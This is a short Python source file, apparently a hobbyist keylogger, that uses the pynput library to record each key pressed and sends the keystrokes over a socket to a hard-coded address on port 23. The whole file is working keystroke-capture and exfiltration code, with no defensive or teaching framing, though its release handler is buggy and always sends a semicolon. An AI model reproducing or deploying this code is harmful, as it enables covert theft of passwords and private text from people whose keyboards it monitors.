import pynput.keyboard as Keyboard
import socket

SERVER_ADDRESS = '192.168.241.39'

SERVER_PORT = 23

c = socket.socket()

c.connect((SERVER_ADDRESS, SERVER_PORT))

def on_press(key):
    # Callback function whenever a key is pressed
    k = key
    try:
        print(f'Key {k.char} pressed!')
        f = str(k).encode()
        c.send(f)
    except AttributeError:
        print(f'Special Key {k} pressed!')


def on_release(key):
    k = ';'
    print(f'Key {k} released')
    f = str(k).encode()
    print(f)
    c.send(f)
    if k == Keyboard.Key.esc:
        # Stop the listenerw
        return False

with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# print("Connected to " + str((SERVER_ADDRESS, SERVER_PORT)))
# while True:
#     try:
#         data = str(k)
#     except EOFError:
#         print("\nOkay. Leaving. Bye")
#         break
#
#     if not data:
#         print("Can't send empty string!")
#         print("Ctrl-D [or Ctrl-Z on Windows] to exit")
#         continue
#
#     # Convert string to bytes. (No-op for python2)
#     data = data.encode()
#
#     # Send data to server
#     c.send(data)
#
#     # Receive response from server
#     data = c.recv(2048)
#     if not data:
#         print("Server abended. Exiting")
#         break
#
#     # Convert back to string for python3
#     data = data.decode()
#
#     print("Got this string from server:")
#     print(data + '\n')
#
# c.close()

